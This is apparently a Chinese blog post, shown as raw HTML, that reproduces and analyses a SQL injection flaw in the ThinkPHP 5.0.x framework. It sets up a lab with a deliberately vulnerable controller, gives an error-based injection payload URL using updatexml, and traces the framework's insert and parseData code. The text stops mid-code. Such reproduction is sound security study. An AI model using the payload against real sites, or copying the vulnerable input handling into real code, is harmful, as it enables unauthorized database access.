<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ThinkPHP5.0.X框架SQL注入漏洞环境搭建 自己还没有用composer,所以先用了phpstudy简答的搭建了一下环境  1. mysql创建数据 create database thinkphp 创建一个名为thinkphp的数据库  create table users(id int auto_increment primary key,username varchar(20),p">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHP5.0.X框架SQL注入漏洞">
<meta property="og:url" content="http://example.com/2023/03/21/TP5sql/index.html">
<meta property="og:site_name" content="End3av0r">
<meta property="og:description" content="ThinkPHP5.0.X框架SQL注入漏洞环境搭建 自己还没有用composer,所以先用了phpstudy简答的搭建了一下环境  1. mysql创建数据 create database thinkphp 创建一个名为thinkphp的数据库  create table users(id int auto_increment primary key,username varchar(20),p">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311762253-4de65fb5-83b3-428a-9bdf-b7e34002cb26.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311910223-af6050fa-8125-4b81-97a4-32ad5a581558.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312397619-1b99b2d1-0902-43fb-a04e-9253055dad9f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312581283-6da25b8e-a05b-4d39-a8d0-f14f7a0aadc1.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122140339648.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190254568.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190932980.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122211516906.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586782016-64ceefb6-bd92-4a90-9197-ccd16a64f272.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586806130-e59464d6-f8b9-4ff9-af73-960efb2613ba.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587324239-15ad0a71-8ec0-410b-a600-3899a308c822.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587378450-963c32a2-e59a-4017-b7d9-0f58adbffe19.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587425904-f1872ee2-e34d-4204-ae67-349b1bbd833b.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587444264-8982234a-14ec-4f6f-889f-821c233fea94.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122233302725.png">
<meta property="article:published_time" content="2023-03-21T12:59:38.000Z">
<meta property="article:modified_time" content="2023-03-22T11:42:46.238Z">
<meta property="article:author" content="End3av0r">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311762253-4de65fb5-83b3-428a-9bdf-b7e34002cb26.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ThinkPHP5.0.X框架SQL注入漏洞</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/End3av0r">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/03/22/c++/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/03/21/ilove-wyw/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/21/TP5sql/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/21/TP5sql/&text=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/21/TP5sql/&is_video=false&description=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ThinkPHP5.0.X框架SQL注入漏洞&body=Check out this article: http://example.com/2023/03/21/TP5sql/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/21/TP5sql/&name=ThinkPHP5.0.X框架SQL注入漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/21/TP5sql/&t=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP5-0-X%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP5.0.X框架SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. mysql创建数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ThinkPHP%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. ThinkPHP基础配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 入口函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%9F%E8%BF%9B%E5%88%B0insert%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 跟进到insert函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-builder-php-x2F-insert"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. builder.php&#x2F;insert()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-foreach-%E7%94%9F%E6%88%90sql%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. foreach()生成sql语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.</span> <span class="toc-text">补充</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ThinkPHP5.0.X框架SQL注入漏洞
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">End3av0r</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-21T12:59:38.000Z" itemprop="datePublished">2023-03-21</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="ThinkPHP5-0-X框架SQL注入漏洞"><a href="#ThinkPHP5-0-X框架SQL注入漏洞" class="headerlink" title="ThinkPHP5.0.X框架SQL注入漏洞"></a>ThinkPHP5.0.X框架SQL注入漏洞</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
<li>自己还没有用composer,所以先用了phpstudy简答的搭建了一下环境</li>
</ol>
<h3 id="1-mysql创建数据"><a href="#1-mysql创建数据" class="headerlink" title="1. mysql创建数据"></a>1. mysql创建数据</h3><ol>
<li><p><code>create database thinkphp</code> 创建一个名为thinkphp的数据库</p>
</li>
<li><p><code>create table users(id int auto_increment primary key,username varchar(20),password varchar(30));</code>创建一个users表里面的段名为id,username,password,其中id设置为主键</p>
</li>
<li><p>接着插入数据<code>Insert into users(id,username,password) values(1,&#39;xbx_0d&#39;,&#39;tobebetter&#39;);</code></p>
</li>
</ol>
<h3 id="2-ThinkPHP基础配置"><a href="#2-ThinkPHP基础配置" class="headerlink" title="2. ThinkPHP基础配置"></a>2. ThinkPHP基础配置</h3><p>没学过ThinkPHP的同学可以参考上面提供的第一个资料</p>
<p> 1.开启debug模式</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311762253-4de65fb5-83b3-428a-9bdf-b7e34002cb26.png" alt="img"></p>
<p> 2.配置database文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311910223-af6050fa-8125-4b81-97a4-32ad5a581558.png" alt="img"></p>
<p> 3.修改application\index\controller\index.php文件<img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312397619-1b99b2d1-0902-43fb-a04e-9253055dad9f.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;get.name/a&quot;</span>);</span><br><span class="line">        <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&quot;users&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&quot;id&quot;</span>=&gt;<span class="number">1</span>])-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$name</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ThinkPHP SQL Test.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 4.尝试触发漏洞</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312581283-6da25b8e-a05b-4d39-a8d0-f14f7a0aadc1.png" alt="img">payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">public</span>/index.php/index/index/index?name[<span class="number">0</span>]=inc&amp;name[<span class="number">1</span>]=<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;name[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
<li><p>因为是复现所以明确知道的是insert函数存在漏洞,接下来是分析</p>
</li>
<li><p>首先看自己定义的控制器的index函数</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122140339648.png" alt="image-20211122140339648"></p>
</li>
<li><p>直接转到insert函数的定义在&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Query.php文件下,这里自己尝试分析了一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span>, <span class="variable">$getLastInsID</span> = <span class="literal">false</span>, <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseExpress</span>(); <span class="comment"># 分析我们写入的表达式是用来查询还是写入</span></span><br><span class="line">        <span class="variable">$data</span>    = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$data</span>);  <span class="comment"># 合并数组,$data是我们自己传入执行语句</span></span><br><span class="line">        <span class="comment">// 生成SQL语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;builder-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$data</span>, <span class="variable">$options</span>, <span class="variable">$replace</span>);</span><br><span class="line">        <span class="comment">//运行到这里的时候sql的值为&quot;INSERT INTO `users` (`username`) VALUES (:data__username) &quot;</span></span><br><span class="line">        <span class="comment">// 获取参数绑定</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBind</span>();</span><br><span class="line">    	<span class="comment">//这里的参数绑定就是绑定:data_username</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) &#123;  <span class="comment">#这里$options[&#x27;fetch_sql&#x27;]值为false跳过</span></span><br><span class="line">            <span class="comment">// 获取实际执行的SQL语句</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;connection-&gt;<span class="title function_ invoke__">getRealSql</span>(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行操作</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="number">0</span> === <span class="variable">$sql</span> ? <span class="number">0</span> : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, <span class="variable">$bind</span>);<span class="comment">#这里就是如果sql语句不为空就执行绑定参数的sql语句</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$sequence</span>  = <span class="variable">$sequence</span> ?: (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable">$lastInsId</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getLastInsID</span>(<span class="variable">$sequence</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$lastInsId</span>) &#123;</span><br><span class="line">                <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>(<span class="variable">$options</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$pk</span>)) &#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="variable">$pk</span>] = <span class="variable">$lastInsId</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;after_insert&#x27;</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$getLastInsID</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$lastInsId</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着我们跟进到<code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code>的insert()函数</p>
<p>这里构造了我们最后要执行的sql语句,所以漏洞一般产生在这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$options</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析并处理数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseData</span>(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$data</span>);    <span class="comment">#以数组形式返回$data数组的键</span></span><br><span class="line">        <span class="variable">$values</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$data</span>);  <span class="comment">#以数组形式放回$data数组的值</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">            [<span class="string">&#x27;%INSERT%&#x27;</span>, <span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%DATA%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$replace</span> ? <span class="string">&#x27;REPLACE&#x27;</span> : <span class="string">&#x27;INSERT&#x27;</span>,</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$fields</span>),</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$values</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            ], <span class="variable">$this</span>-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>先转到看一下数据的解析<code>$data = $this-&gt;parseData($data, $options)</code></p>
<p>假设我们传入的是<code>?name[0]=username&amp;name[1]=password&amp;name[2]=123456</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getFieldsBind</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">  <span class="comment">#这里遍历了数组 此时的数组是Array ( [username] =&gt; Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) ) </span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="comment">#$key username</span></span><br><span class="line">            <span class="comment">#$val Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) </span></span><br><span class="line">            <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            <span class="comment">#$item=`username`</span></span><br><span class="line">            <span class="comment">#这里的$val是数组所以跳过</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#如果字段名含有.或者字段名不在$fileds则报错</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123; <span class="comment">#跟进到这里</span></span><br><span class="line">                <span 